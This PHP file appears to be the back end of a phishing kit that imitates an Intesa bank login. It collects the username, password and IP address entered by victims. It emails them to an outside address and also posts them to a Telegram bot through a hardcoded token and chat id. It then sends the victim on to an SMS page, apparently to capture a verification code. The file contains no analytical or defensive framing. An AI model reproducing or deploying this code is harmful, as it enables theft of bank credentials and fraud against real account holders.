<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if(!empty($_POST['user']) &&  !empty($_POST['Pass'])){
$message  = "=========[BILLING INFO]=========\n";
$message .= "User  : ".$_POST['user']."\n";
$message .= "Pass  : ".$_POST['Pass']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP : http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[BILLING INFO]=========";
$to="gcc@gmers.com";
$subject = "LOGIN INTESA [$ip]";
$headers = "From: LOGIN INTESA <>";
$headers .= "MIME-Version: 1.0\n";
mail($to, $subject, $message,$headers);
		    $token = "6615372830:AAF4WMjDFb6tnsNuJgUoYHJF3OM2Utrz45M";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-4024396725&text=" . urlencode($message)."" );
header("Location:../sms-user.php");
}else{
header("Location:../index.php");
}

?>